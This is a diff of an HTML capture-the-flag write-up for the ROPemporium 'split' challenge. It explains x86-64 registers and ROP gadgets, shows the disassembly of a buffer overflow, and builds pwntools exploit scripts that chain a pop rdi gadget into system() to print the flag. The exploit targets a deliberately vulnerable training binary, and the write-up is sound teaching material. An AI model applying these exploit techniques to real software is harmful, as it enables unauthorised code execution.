@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2021-08-29 Sun 17:08 -->
+<!-- 2021-09-21 Tue 15:41 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>ROPemporium | Split</title>
 <meta name="generator" content="Org mode">
+<meta name="author" content="Simon Søndergaard Christensen">
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script type="text/javascript">
-// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
 <!--/*--><![CDATA[/*><!--*/
      function CodeHighlightOn(elem, id)
      {
@@ -78,7 +79,7 @@
 </nav>
 
 <div id="outline-container-orged47b43" class="outline-2">
-<h2 id="orged47b43"><span class="section-number-2">1.</span> Introduction</h2>
+<h2 id="orged47b43"><span class="section-number-2">1</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 Welcome to my write-up for the second challenge on <a href="https://ropemporium.com">ROPemporium</a>, called <code>split</code>.
@@ -92,7 +93,7 @@ Then there is also the concept of ROPgadgets, which is the main element of retur
 </p>
 </div>
 <div id="outline-container-org0da731c" class="outline-3">
-<h3 id="org0da731c"><span class="section-number-3">1.1.</span> Wtf is a register?</h3>
+<h3 id="org0da731c"><span class="section-number-3">1.1</span> Wtf is a register?</h3>
 <div class="outline-text-3" id="text-1-1">
 <p>
 In my last post I briefly mentioned that through the manipulation of registers we could execute arbitrary code.
@@ -269,7 +270,7 @@ An amazing tool to see which registers are used for what function parameters for
 </div>
 
 <div id="outline-container-org1c75e1a" class="outline-3">
-<h3 id="org1c75e1a"><span class="section-number-3">1.2.</span> ROP gadgets</h3>
+<h3 id="org1c75e1a"><span class="section-number-3">1.2</span> ROP gadgets</h3>
 <div class="outline-text-3" id="text-1-2">
 <p>
 According to the paper <a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">Return-Oriented-Programming (ROP FTW)</a>, ROP gadgets are small instruction sequences that end in a <code>ret</code> instruction or <code>0xc3</code> if looking at a hexdump of a binary.
@@ -327,7 +328,7 @@ These two types of gadgets are the ones you will need to find in order to comple
 </div>
 </div>
 <div id="outline-container-orgc810bd4" class="outline-2">
-<h2 id="orgc810bd4"><span class="section-number-2">2.</span> Recon</h2>
+<h2 id="orgc810bd4"><span class="section-number-2">2</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
 Again before I do any actual exploitation, I'll try to gather as much information as possible about the target.
@@ -341,13 +342,13 @@ The most important thing in this case is that we learn about ROP so recon is min
 </p>
 </div>
 <div id="outline-container-org4ec5d1e" class="outline-3">
-<h3 id="org4ec5d1e"><span class="section-number-3">2.1.</span> File</h3>
+<h3 id="org4ec5d1e"><span class="section-number-3">2.1</span> File</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
 The output here is exactly the same as last post, except for the name of the binary.
 But I'll keep it here for good measure.
 </p>
-<pre class="example" id="org040bb07">
+<pre class="example" id="org655dc12">
 ┌────[~/ha/bi/ropemporium/split on  master [?]
 └─&gt;file split
 split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
@@ -355,12 +356,12 @@ split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
 </div>
 </div>
 <div id="outline-container-orgd40e9c5" class="outline-3">
-<h3 id="orgd40e9c5"><span class="section-number-3">2.2.</span> Checksec</h3>
+<h3 id="orgd40e9c5"><span class="section-number-3">2.2</span> Checksec</h3>
 <div class="outline-text-3" id="text-2-2">
 <p>
 Same situation for <code>checksec</code>'s output, if you need a refresher read my <a href="https://c3lphie.com/2021-03-22-ropemporium-ret2win.html">last post</a>.
 </p>
-<pre class="example" id="org47a4c1e">
+<pre class="example" id="org67af818">
 ┌────[~/ha/bi/ropemporium/split on  master [?]
 └─&gt;checksec split
 [*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/split/split'
@@ -373,7 +374,7 @@ Same situation for <code>checksec</code>'s output, if you need a refresher read 
 </div>
 </div>
 <div id="outline-container-org4fb08d3" class="outline-3">
-<h3 id="org4fb08d3"><span class="section-number-3">2.3.</span> Static analysis</h3>
+<h3 id="org4fb08d3"><span class="section-number-3">2.3</span> Static analysis</h3>
 <div class="outline-text-3" id="text-2-3">
 <p>
 Once again we go through static analysis of the binary before we begin our exploit.
@@ -381,7 +382,7 @@ Once again we go through static analysis of the binary before we begin our explo
 </div>
 
 <div id="outline-container-org1c86ab1" class="outline-4">
-<h4 id="org1c86ab1"><span class="section-number-4">2.3.1.</span> Strings</h4>
+<h4 id="org1c86ab1"><span class="section-number-4">2.3.1</span> Strings</h4>
 <div class="outline-text-4" id="text-2-3-1">
 <p>
 First thing we should do, that I didn't last time, is to look at the strings in the binary.
@@ -392,7 +393,7 @@ Because they might give us some usefull information, or clues as to how this cha
 This is also often the case in CTF challenges.
 </p>
 
-<figure id="orgf936457">
+<figure id="org83cf211">
 <img src="file:///home/c3lphie/repositories/blog/static/pics/split_strings.png" alt="split_strings.png">
 
 <figcaption><span class="figure-number">Figure 1: </span>Strings with memory addresses found in Binary Ninja</figcaption>
@@ -408,28 +409,28 @@ So let's note down that adress <code>0x00601060</code> for future use!
 </div>
 </div>
 <div id="outline-container-org913d9da" class="outline-4">
-<h4 id="org913d9da"><span class="section-number-4">2.3.2.</span> Main function</h4>
+<h4 id="org913d9da"><span class="section-number-4">2.3.2</span> Main function</h4>
 <div class="outline-text-4" id="text-2-3-2">
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 1: </span>main function dissasembled</label><pre class="src src-asm"><span style="color: #de935f;">push</span>    <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rbp</span>, rsp <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rax</span>, qword <span style="color: #c5c8c6;">[</span>rel stdout<span style="color: #c5c8c6;">]</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">ecx</span>, 0x0
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edx</span>, 0x2
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">esi</span>, 0x0
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rdi</span>, rax
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">setvbuf</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x4007e8  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"split by ROP Emporium"</span><span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x4007fe  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"x86_64\n"</span><span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">eax</span>, 0x0
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">pwnme</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400806  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"\nExiting"</span><span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">eax</span>, 0x0
-<span style="color: #de935f;">pop</span>     <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">retn</span>     <span style="color: #c5c8c6;">{</span>__return_addr<span style="color: #c5c8c6;">}</span>
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>main function dissasembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
+mov     rbp, rsp {__saved_rbp}
+mov     rax, qword [rel stdout]
+mov     ecx, 0x0
+mov     edx, 0x2
+mov     esi, 0x0
+mov     rdi, rax
+call    setvbuf
+mov     edi, 0x4007e8  {"split by ROP Emporium"}
+call    puts
+mov     edi, 0x4007fe  {"x86_64\n"}
+call    puts
+mov     eax, 0x0
+call    pwnme
+mov     edi, 0x400806  {"\nExiting"}
+call    puts
+mov     eax, 0x0
+pop     rbp {__saved_rbp}
+retn     {__return_addr}
 </pre>
 </div>
 <p>
@@ -439,44 +440,44 @@ Which again the main focus of for exploitation.
 </div>
 </div>
 <div id="outline-container-org4dacba0" class="outline-4">
-<h4 id="org4dacba0"><span class="section-number-4">2.3.3.</span> pwnme function</h4>
+<h4 id="org4dacba0"><span class="section-number-4">2.3.3</span> pwnme function</h4>
 <div class="outline-text-4" id="text-2-3-3">
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 2: </span>pwnme function disassembled</label><pre class="src src-asm"><span style="color: #de935f;">push</span>    <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rbp</span>, rsp <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">sub</span>     <span style="color: #b5bd68;">rsp</span>, 0x20
-<span style="color: #de935f;">lea</span>     <span style="color: #b5bd68;">rax</span>, <span style="color: #c5c8c6;">[</span>rbp-0x20 <span style="color: #8abeb7;">{</span>buffer<span style="color: #8abeb7;">}</span><span style="color: #c5c8c6;">]</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edx</span>, 0x20
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">esi</span>, 0x0
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rdi</span>, rax <span style="color: #c5c8c6;">{</span>buffer<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">memset</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400810  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"Contriving a reason to ask user &#8230;"</span><span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x40083c
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">eax</span>, 0x0
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">printf</span>
-<span style="color: #de935f;">lea</span>     <span style="color: #b5bd68;">rax</span>, <span style="color: #c5c8c6;">[</span>rbp-0x20 <span style="color: #8abeb7;">{</span>buffer<span style="color: #8abeb7;">}</span><span style="color: #c5c8c6;">]</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edx</span>, 0x60
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rsi</span>, rax <span style="color: #c5c8c6;">{</span>buffer<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x0
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">read</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x40083f  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"Thank you!"</span><span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
-<span style="color: #de935f;">nop</span>     
-<span style="color: #de935f;">leave</span>    <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">retn</span>     <span style="color: #c5c8c6;">{</span>__return_addr<span style="color: #c5c8c6;">}</span>
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>pwnme function disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
+mov     rbp, rsp {__saved_rbp}
+sub     rsp, 0x20
+lea     rax, [rbp-0x20 {buffer}]
+mov     edx, 0x20
+mov     esi, 0x0
+mov     rdi, rax {buffer}
+call    memset
+mov     edi, 0x400810  {"Contriving a reason to ask user …"}
+call    puts
+mov     edi, 0x40083c
+mov     eax, 0x0
+call    printf
+lea     rax, [rbp-0x20 {buffer}]
+mov     edx, 0x60
+mov     rsi, rax {buffer}
+mov     edi, 0x0
+call    read
+mov     edi, 0x40083f  {"Thank you!"}
+call    puts
+nop     
+leave    {__saved_rbp}
+retn     {__return_addr}
 </pre>
 </div>
 <p>
 Instead of just focusing on the HLIL version of the function, like last time, this time we're going to compare the two versions to get a better understanding of how assembly works.
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 3: </span>pwnme function HLIL</label><pre class="src src-c"><span style="color: #81a2be;">void</span> <span style="color: #de935f;">buffer</span>
-memset<span style="color: #c5c8c6;">(</span>&amp;buffer, 0, 32<span style="color: #c5c8c6;">)</span>
-<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"Contriving a reason to ask user &#8230;"</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #de935f;">printf</span><span style="color: #c5c8c6;">(</span>format: data_40083c<span style="color: #c5c8c6;">)</span>
-<span style="color: #de935f;">read</span><span style="color: #c5c8c6;">(</span>fd: 0, buf: &amp;buffer, nbytes: 96<span style="color: #c5c8c6;">)</span>
-<span style="color: #b5bd68;">return</span> puts<span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"Thank you!"</span><span style="color: #c5c8c6;">)</span>
+<label class="org-src-name"><span class="listing-number">Listing 3: </span>pwnme function HLIL</label><pre class="src src-c">void buffer
+memset(&amp;buffer, 0, 32)
+puts(str: "Contriving a reason to ask user …")
+printf(format: data_40083c)
+read(fd: 0, buf: &amp;buffer, nbytes: 96)
+return puts(str: "Thank you!")
 </pre>
 </div>
 <p>
@@ -508,16 +509,16 @@ The fact that we can write more information into the buffer than was allocated a
 </div>
 </div>
 <div id="outline-container-org8ba14c9" class="outline-4">
-<h4 id="org8ba14c9"><span class="section-number-4">2.3.4.</span> usefulFunction</h4>
+<h4 id="org8ba14c9"><span class="section-number-4">2.3.4</span> usefulFunction</h4>
 <div class="outline-text-4" id="text-2-3-4">
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 4: </span>usefulFunction disassembled</label><pre class="src src-asm"><span style="color: #de935f;">push</span>    <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rbp</span>, rsp <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x40084a  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"/bin/ls"</span><span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">system</span>
-<span style="color: #de935f;">nop</span>     
-<span style="color: #de935f;">pop</span>     <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
-<span style="color: #de935f;">retn</span>     <span style="color: #c5c8c6;">{</span>__return_addr<span style="color: #c5c8c6;">}</span>
+<label class="org-src-name"><span class="listing-number">Listing 4: </span>usefulFunction disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
+mov     rbp, rsp {__saved_rbp}
+mov     edi, 0x40084a  {"/bin/ls"}
+call    system
+nop     
+pop     rbp {__saved_rbp}
+retn     {__return_addr}
 </pre>
 </div>
 <p>
@@ -538,7 +539,7 @@ We'll need it later in our first ROP chain.
 </div>
 </div>
 <div id="outline-container-orge6ac07c" class="outline-2">
-<h2 id="orge6ac07c"><span class="section-number-2">3.</span> Exploitation</h2>
+<h2 id="orge6ac07c"><span class="section-number-2">3</span> Exploitation</h2>
 <div class="outline-text-2" id="text-3">
 <p>
 Now we are ready to begin exploiting the binary!
@@ -546,7 +547,7 @@ I won't go as much into detail about the buffer overflow, it is the exact same p
 </p>
 </div>
 <div id="outline-container-org776cd60" class="outline-3">
-<h3 id="org776cd60"><span class="section-number-3">3.1.</span> Buffer overflow</h3>
+<h3 id="org776cd60"><span class="section-number-3">3.1</span> Buffer overflow</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
 A quick recap of finding a basic buffer overflow.
@@ -556,22 +557,22 @@ A quick recap of finding a basic buffer overflow.
 I start with a basic template as you can see below.
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *
+<pre class="src src-python">from pwn import *
 
-context.update<span style="color: #c5c8c6;">(</span>arch=<span style="color: #8abeb7;">"amd64"</span>, os=<span style="color: #8abeb7;">"linux"</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">proc</span> = process<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"./split"</span><span style="color: #c5c8c6;">)</span>
-gdb.attach<span style="color: #c5c8c6;">(</span>proc, <span style="color: #8abeb7;">"""</span>
-<span style="color: #8abeb7;">break main</span>
-<span style="color: #8abeb7;">"""</span><span style="color: #c5c8c6;">)</span>
+context.update(arch="amd64", os="linux")
+proc = process("./split")
+gdb.attach(proc, """
+break main
+""")
 
-<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">send_recv</span><span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span>: <span style="color: #b294bb;">bytes</span><span style="color: #c5c8c6;">)</span>:
-    proc.recvuntil<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"&gt;"</span><span style="color: #c5c8c6;">)</span>
-    proc.send<span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span><span style="color: #c5c8c6;">)</span>
+def send_recv(buffer: bytes):
+    proc.recvuntil("&gt;")
+    proc.send(buffer)
 
-<span style="color: #f0c674;">payload</span> = cyclic<span style="color: #c5c8c6;">(</span>100<span style="color: #c5c8c6;">)</span>
+payload = cyclic(100)
 
-send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>
-proc.interactive<span style="color: #c5c8c6;">()</span>
+send_recv(payload)
+proc.interactive()
 </pre>
 </div>
 <p>
@@ -583,29 +584,29 @@ I found the offset the be at <code>0x6161616b</code> in the cyclic sequence, so 
 The following exploit returns into <code>usefulFunction</code>
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *
+<pre class="src src-python">from pwn import *
 
-context.update<span style="color: #c5c8c6;">(</span>arch=<span style="color: #8abeb7;">"amd64"</span>, os=<span style="color: #8abeb7;">"linux"</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">proc</span> = process<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"./split"</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">gdb.attach(proc, """</span>
-<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">break main</span>
-<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">""")</span>
+context.update(arch="amd64", os="linux")
+proc = process("./split")
+# gdb.attach(proc, """
+# break main
+# """)
 
-<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">send_recv</span><span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span>: <span style="color: #b294bb;">bytes</span><span style="color: #c5c8c6;">)</span>:
-    proc.recvuntil<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"&gt;"</span><span style="color: #c5c8c6;">)</span>
-    proc.send<span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span><span style="color: #c5c8c6;">)</span>
+def send_recv(buffer: bytes):
+    proc.recvuntil("&gt;")
+    proc.send(buffer)
 
-<span style="color: #f0c674;">payload</span> = cyclic<span style="color: #c5c8c6;">(</span>cyclic_find<span style="color: #8abeb7;">(</span>0x6161616b<span style="color: #8abeb7;">)</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">payload</span> += p64<span style="color: #c5c8c6;">(</span>0x400742<span style="color: #c5c8c6;">)</span>
+payload = cyclic(cyclic_find(0x6161616b))
+payload += p64(0x400742)
 
-send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>
-proc.interactive<span style="color: #c5c8c6;">()</span>
+send_recv(payload)
+proc.interactive()
 </pre>
 </div>
 <p>
 Which calls <code>/bin/ls</code>:
 </p>
-<pre class="example" id="org0a284c2">
+<pre class="example" id="org6c4c40c">
 ┌────[~/ha/bi/ropemporium/split on  master [?]
 └─&gt;python exploit.py
 [+] Starting local process './split': pid 384887
@@ -622,7 +623,7 @@ So let find our first gadget!
 </div>
 </div>
 <div id="outline-container-orgf6d1aef" class="outline-3">
-<h3 id="orgf6d1aef"><span class="section-number-3">3.2.</span> Finding gadgets</h3>
+<h3 id="orgf6d1aef"><span class="section-number-3">3.2</span> Finding gadgets</h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
 As mentioned earlier I'll be using <code>ropper</code> to find the ROP gadgets needed for this exploit.
@@ -632,7 +633,7 @@ As mentioned earlier I'll be using <code>ropper</code> to find the ROP gadgets n
 In fact we only need one gadget for this ROP chain since we already have a <code>system</code> call.
 So what we need to do is find a gadget that can <code>pop</code> an address into a register from the stack.
 </p>
-<pre class="example" id="org7b736d9">
+<pre class="example" id="orgdbba3cd">
 ┌────[~/ha/bi/ropemporium/split on  master [?]
 └─&gt;ropper -f split --console
 [INFO] Load gadgets from cache
@@ -645,7 +646,7 @@ So what we need to do is find a gadget that can <code>pop</code> an address into
 I use the <code>--console</code> flag because it loads the entire binary once, which makes multiple searches faster.
 Now all we gotta do is search for gadgets starting with a <code>pop</code> instruction.
 </p>
-<pre class="example" id="orgc1c703b">
+<pre class="example" id="org51bbe0b">
 (split/ELF/x86_64)&gt; search pop
 [INFO] Searching for gadgets: pop
 
@@ -683,7 +684,7 @@ And just take a note of that address.
 </div>
 </div>
 <div id="outline-container-org3a4b1f8" class="outline-3">
-<h3 id="org3a4b1f8"><span class="section-number-3">3.3.</span> Creating the chain</h3>
+<h3 id="org3a4b1f8"><span class="section-number-3">3.3</span> Creating the chain</h3>
 <div class="outline-text-3" id="text-3-3">
 <ul class="org-ul">
 <li>State "DONE"       from "NEXT"       <span class="timestamp-wrapper"><span class="timestamp">[2021-04-09 Fri 17:21]</span></span></li>
@@ -726,19 +727,19 @@ All we have to do now is chain it together!
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *
+<pre class="src src-python">from pwn import *
 
 ...
 
-<span style="color: #f0c674;">popRdi</span> = p64<span style="color: #c5c8c6;">(</span>0x4007c3<span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">system</span> = p64<span style="color: #c5c8c6;">(</span>0x40074b<span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">usefulData</span> = p64<span style="color: #c5c8c6;">(</span>0x601060<span style="color: #c5c8c6;">)</span>
+popRdi = p64(0x4007c3)
+system = p64(0x40074b)
+usefulData = p64(0x601060)
 
-<span style="color: #f0c674;">payload</span> = cyclic<span style="color: #c5c8c6;">(</span>cyclic_find<span style="color: #8abeb7;">(</span>0x6161616b<span style="color: #8abeb7;">)</span><span style="color: #c5c8c6;">)</span>
+payload = cyclic(cyclic_find(0x6161616b))
 
-send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>
+send_recv(payload)
 
-proc.interactive<span style="color: #c5c8c6;">()</span>
+proc.interactive()
 </pre>
 </div>
 <p>
@@ -751,22 +752,22 @@ But which order?
 Well we should of course use the same order as it's done in assembly!
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *
+<pre class="src src-python">from pwn import *
 
 ...
 
-<span style="color: #f0c674;">popRdi</span> = p64<span style="color: #c5c8c6;">(</span>0x4007c3<span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">system</span> = p64<span style="color: #c5c8c6;">(</span>0x40074b<span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">usefulData</span> = p64<span style="color: #c5c8c6;">(</span>0x601060<span style="color: #c5c8c6;">)</span>
+popRdi = p64(0x4007c3)
+system = p64(0x40074b)
+usefulData = p64(0x601060)
 
-<span style="color: #f0c674;">payload</span> = cyclic<span style="color: #c5c8c6;">(</span>cyclic_find<span style="color: #8abeb7;">(</span>0x6161616b<span style="color: #8abeb7;">)</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">payload</span> += popRdi
-<span style="color: #f0c674;">payload</span> += usefulData
-<span style="color: #f0c674;">payload</span> += system
+payload = cyclic(cyclic_find(0x6161616b))
+payload += popRdi
+payload += usefulData
+payload += system
 
-send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>
+send_recv(payload)
 
-proc.interactive<span style="color: #c5c8c6;">()</span>
+proc.interactive()
 </pre>
 </div>
 <p>
@@ -776,44 +777,44 @@ First we <code>pop</code> the <code>usefulData</code> address into the <code>rdi
 </div>
 
 <div id="outline-container-org925bbd6" class="outline-3">
-<h3 id="org925bbd6"><span class="section-number-3">3.4.</span> Final exploit</h3>
+<h3 id="org925bbd6"><span class="section-number-3">3.4</span> Final exploit</h3>
 <div class="outline-text-3" id="text-3-4">
 <p>
 Here is the final exploit, which will show us the flag.
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *
+<pre class="src src-python">from pwn import *
 
-context.update<span style="color: #c5c8c6;">(</span>arch=<span style="color: #8abeb7;">"amd64"</span>, os=<span style="color: #8abeb7;">"linux"</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">proc</span> = process<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"./split"</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">gdb.attach(proc, """</span>
-<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">break main</span>
-<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">""")</span>
+context.update(arch="amd64", os="linux")
+proc = process("./split")
+# gdb.attach(proc, """
+# break main
+# """)
 
 
-<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">send_recv</span><span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span>: <span style="color: #b294bb;">bytes</span><span style="color: #c5c8c6;">)</span>:
-    proc.recvuntil<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"&gt;"</span><span style="color: #c5c8c6;">)</span>
-    proc.send<span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span><span style="color: #c5c8c6;">)</span>
+def send_recv(buffer: bytes):
+    proc.recvuntil("&gt;")
+    proc.send(buffer)
 
-<span style="color: #f0c674;">popRdi</span> = p64<span style="color: #c5c8c6;">(</span>0x4007c3<span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">system</span> = p64<span style="color: #c5c8c6;">(</span>0x40074b<span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">usefulData</span> = p64<span style="color: #c5c8c6;">(</span>0x601060<span style="color: #c5c8c6;">)</span>
+popRdi = p64(0x4007c3)
+system = p64(0x40074b)
+usefulData = p64(0x601060)
 
-<span style="color: #f0c674;">payload</span> = cyclic<span style="color: #c5c8c6;">(</span>cyclic_find<span style="color: #8abeb7;">(</span>0x6161616b<span style="color: #8abeb7;">)</span><span style="color: #c5c8c6;">)</span>
-<span style="color: #f0c674;">payload</span> += popRdi
-<span style="color: #f0c674;">payload</span> += usefulData
-<span style="color: #f0c674;">payload</span> += system
+payload = cyclic(cyclic_find(0x6161616b))
+payload += popRdi
+payload += usefulData
+payload += system
 
-send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>
+send_recv(payload)
 
-proc.interactive<span style="color: #c5c8c6;">()</span>
+proc.interactive()
 </pre>
 </div>
 
 <p>
 If we run it in the terminal we get the following flag:
 </p>
-<pre class="example" id="org00c7102">
+<pre class="example" id="org79db98f">
 ┌────[~/ha/bi/ropemporium/split on  master [?]
 └─&gt;python exploit.py
 [+] Starting local process './split': pid 389100
@@ -832,7 +833,7 @@ An there you go ladies and gentlemen, we got the flag!
 </div>
 
 <div id="outline-container-org3736ea2" class="outline-2">
-<h2 id="org3736ea2"><span class="section-number-2">4.</span> Conclusions</h2>
+<h2 id="org3736ea2"><span class="section-number-2">4</span> Conclusions</h2>
 <div class="outline-text-2" id="text-4">
 <p>
 In this post we dove into what registers are and how they are used as parameters for functions in the 64-bit architecture.
